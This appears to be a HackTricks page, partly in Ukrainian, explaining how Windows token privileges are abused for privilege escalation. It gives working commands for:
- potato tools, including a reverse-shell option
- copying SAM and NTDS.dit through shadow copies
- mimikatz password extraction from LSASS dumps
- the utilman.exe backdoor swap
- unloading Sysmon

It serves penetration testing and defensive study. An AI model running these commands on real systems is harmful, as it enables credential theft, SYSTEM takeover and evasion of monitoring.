# Зловживання токенами

{{#include ../../banners/hacktricks-training.md}}

## Tokens

If you **don't know what are Windows Access Tokens** read this page before continuing:


{{#ref}}
access-tokens.md
{{#endref}}

**Можливо, ви зможете підвищити привілеї, зловживаючи токенами, які вже маєте**

### SeImpersonatePrivilege

This is privilege that is held by any process allows the impersonation (but not creation) of any token, given that a handle to it can be obtained. A privileged token can be acquired from a Windows service (DCOM) by inducing it to perform NTLM authentication against an exploit, subsequently enabling the execution of a process with SYSTEM privileges. This vulnerability can be exploited using various tools, such as [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (which requires winrm to be disabled), [SweetPotato](https://github.com/CCob/SweetPotato), and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: on Windows 10 1809+/Server 2019+, prefer **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, or **PrintSpoofer** depending on which RPC/COM surface is still reachable.
- If you compromised a service running as **`LOCAL SERVICE`** or **`NETWORK SERVICE`** and `whoami /priv` shows a **filtered token** without `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recover the account's **default privilege set** first (for example with **FullPowers**) and retry the potato family afterwards.
- Some newer forks are more operator-friendly than the original tools. For example, **SigmaPotato** adds reflection/in-memory execution and modern Windows compatibility, while **PrintNotifyPotato** abuses the PrintNotify COM service and is often useful when the classic Spooler path is disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Воно дуже схоже на **SeImpersonatePrivilege**, воно використовуватиме **той самий метод** для отримання privileged token.\
Потім цей privilege дозволяє **призначити primary token** новому/призупиненому process. Із privileged impersonation token ви можете derivате primary token (DuplicateTokenEx).\
За допомогою token ви можете створити **new process** через 'CreateProcessAsUser' або створити process у стані suspended і **встановити token** (зазвичай ви не можете змінити primary token запущеного process).

### SeTcbPrivilege

Якщо у вас увімкнено цей token, ви можете використовувати **KERB_S4U_LOGON**, щоб отримати **impersonation token** для будь-якого іншого користувача без знання credentials, **додати довільну group** (admins) до token, встановити **integrity level** token на "**medium**" і призначити цей token **current thread** (SetThreadToken).

### SeBackupPrivilege

Цей privilege змушує систему **надавати повний read access** до будь-якого file (обмежено лише read operations). Він використовується для **читання password hashes локальних Administrator** accounts із registry, після чого можна використовувати tools на кшталт "**psexec**" або "**wmiexec**" з hash (Pass-the-Hash technique). Однак цей technique не працює за двох умов: коли Local Administrator account disabled або коли діє policy, що забирає administrative rights у Local Administrators, які підключаються remotely.\
На практиці найнадійніший вбудований workflow зазвичай **VSS + `robocopy /b`**: створіть/відкрийте shadow copy, потім скопіюйте `SAM`/`SYSTEM` або `NTDS.dit` у **backup mode**, що обходить file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Дозвіл на **write access** до будь-якого системного файлу, незалежно від **Access Control List (ACL)** файлу, надається цим привілеєм. Він відкриває численні можливості для ескалації, включно зі здатністю **modify services**, виконувати DLL Hijacking та встановлювати **debuggers** через Image File Execution Options, серед інших технік.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege — це потужний дозвіл, особливо корисний, коли користувач має можливість impersonate tokens, але також і за відсутності SeImpersonatePrivilege. Ця можливість залежить від здатності impersonate токен, який представляє того самого користувача і чий integrity level не перевищує рівень поточного процесу.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Можна використати SeCreateTokenPrivilege для EoP, impersonating tokens за певних умов.
- **Conditions for Token Impersonation:** Успішний token impersonation вимагає, щоб цільовий token належав тому самому користувачу і мав integrity level, менший або рівний integrity level процесу, що намагається виконати impersonation.
- **Creation and Modification of Impersonation Tokens:** Користувачі можуть створити impersonation token і підвищити його, додавши SID (Security Identifier) привілейованої групи.

### SeLoadDriverPrivilege

Цей привілей дозволяє **load and unload device drivers** шляхом створення запису в реєстрі зі специфічними значеннями для `ImagePath` і `Type`. Оскільки прямий write access до `HKLM` (HKEY_LOCAL_MACHINE) обмежений, замість нього потрібно використовувати `HKCU` (HKEY_CURRENT_USER). Однак, щоб зробити `HKCU` розпізнаваним для ядра під час конфігурації драйвера, потрібно дотриматися певного шляху.

Сучасне offensive use зазвичай **BYOVD** (bring your own vulnerable driver): завантажити **signed but vulnerable** kernel driver і потім використати його IOCTLs, щоб вимкнути захист або перейти до kernel code execution. Майте на увазі, що на новіших збірках Windows 11/Server **Microsoft vulnerable driver blocklist** та/або **HVCI/Memory Integrity** часто ламають старі public chains, тож класичні приклади на кшталт `szkg64.sys` більше не є універсально надійними.

Цей шлях: `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — Relative Identifier поточного користувача. Усередині `HKCU` весь цей шлях потрібно створити, а також встановити два значення:

- `ImagePath`, який є шляхом до binary, що буде виконано
- `Type`, зі значенням `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Отримайте доступ до `HKCU` замість `HKLM` через обмежений write access.
2. Створіть шлях `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` всередині `HKCU`, де `<RID>` представляє Relative Identifier поточного користувача.
3. Встановіть `ImagePath` у шлях виконання binary.
4. Призначте `Type` як `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Більше способів зловживати цим привілеєм у [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Це схоже на **SeRestorePrivilege**. Його основна функція дозволяє процесу **взяти у володіння об’єкт**, обходячи вимогу явного дискреційного доступу через надання прав доступу WRITE_OWNER. Процес полягає спочатку в отриманні права власності на цільовий ключ реєстру для цілей запису, а потім у зміні DACL, щоб увімкнути операції запису.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Цей привілей дозволяє **debug інших процесів**, включно з читанням і записом у пам’ять. З цим привілеєм можна застосовувати різні стратегії memory injection, здатні обходити більшість antivirus і host intrusion prevention solutions.

На сучасному Windows пам’ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **non-protected SYSTEM processes** і дублювати їхні токени, але це **не** гарантує, що ви зможете взаємодіяти з **LSASS**. Якщо увімкнено **RunAsPPL / LSA Protection**, non-protected processes не можуть читати або інжектити в LSASS, навіть якщо є `SeDebugPrivilege`. У такому разі вкрадіть токен з іншого non-PPL SYSTEM process або використайте ланцюжок з PPL bypass/BYOVD замість припущення, що `procdump` спрацює. Для повного прикладу копіювання токена з використанням `SeDebugPrivilege` + `SeImpersonatePrivilege` див. [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Можна використати [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) з [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), щоб **capture the memory of a process**. Зокрема, це може застосовуватися до процесу **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за зберігання облікових даних користувача після успішного входу в систему.

Потім можна завантажити цей дамп у mimikatz, щоб отримати паролі:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Якщо ви хочете отримати `NT SYSTEM` shell, ви можете використати:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Це право (Perform volume maintenance tasks) дозволяє відкривати raw volume device handles (наприклад, \\.\C:) для прямого disk I/O, що обходить NTFS ACLs. З його допомогою можна копіювати байти будь-якого файлу на volume, читаючи underlying blocks, що дає змогу виконувати arbitrary file read конфіденційних даних (наприклад, machine private keys у %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS через VSS). Це особливо впливає на CA servers, де exfiltrating CA private key дозволяє створити Golden Certificate для impersonate будь-якого principal.

Див. детальні техніки та mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Токени, які відображаються як Disabled, зазвичай можна увімкнути, тож часто можна зловживати як _Enabled_, так і _Disabled_ привілеями.

### Enable All the tokens

Якщо у вас є disabled привілеї, ви можете використати скрипт [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі токени:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Або **script**, вбудований у цьому [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Повний cheatsheet привілеїв token тут: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), нижче буде лише короткий перелік прямих способів використати privilege, щоб отримати admin session або прочитати sensitive files.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Дякую [Aurélien Chalot](https://twitter.com/Defte_) за оновлення. Скоро спробую перефразувати це в більш recipe-like формат.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Читайте sensitive files з `robocopy /b` або спеціальними SeBackup-aware copy helpers.                                                                                                                                                                                                                                                                 | <p>- Дуже корисно для `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, а іноді й `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` зручний, але спеціальні SeBackup cmdlets/APIs часто гнучкіші для locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Створіть arbitrary token, включно з local admin rights, за допомогою `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Дублюйте **non-PPL** SYSTEM token або знімайте memory з non-protected process.                                                                                                                                                                                                                                                                 | <p>LSASS dumping зазвичай блокується, якщо увімкнено RunAsPPL/LSA Protection.</p><p>Script можна знайти тут: [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Використайте **Potato family** / named-pipe impersonation, щоб запустити SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, тощо).                                                                                                                                                                                    | <p>Найпрактичніше з service accounts, таких як IIS APPPOOL, MSSQL, scheduled tasks, або будь-який context, який уже має `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Завантажте signed-but-vulnerable kernel driver (BYOVD)<br>2. Використайте IOCTLs драйвера, щоб отримати kernel R/W, вимкнути security tooling або підвищити до SYSTEM<br><br>Альтернативно, privilege можна використати для вивантаження security-related drivers за допомогою вбудованої команди <code>fltMC</code>, тобто <code>fltMC sysmondrv</code></p>                     | <p>Старі public drivers, такі як <code>szkg64.sys</code>, дедалі частіше блокуються на modern Windows через vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Запустіть PowerShell/ISE, маючи privilege SeRestore.<br>2. Увімкніть privilege за допомогою <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Перейменуйте utilman.exe на utilman.old<br>4. Перейменуйте cmd.exe на utilman.exe<br>5. Заблокуйте console і натисніть Win+U</p> | <p>Attack може бути виявлений деяким AV software.</p><p>Альтернативний метод спирається на заміну service binaries, що зберігаються в "Program Files", використовуючи той самий privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Перейменуйте cmd.exe на utilman.exe<br>4. Заблокуйте console і натисніть Win+U</p>                                                                                                                                       | <p>Attack може бути виявлений деяким AV software.</p><p>Альтернативний метод спирається на заміну service binaries, що зберігаються в "Program Files", використовуючи той самий privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulate tokens, щоб вони містили local admin rights. Може вимагати SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Погляньте на цю table, що визначає Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Погляньте на [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) про privesc з tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
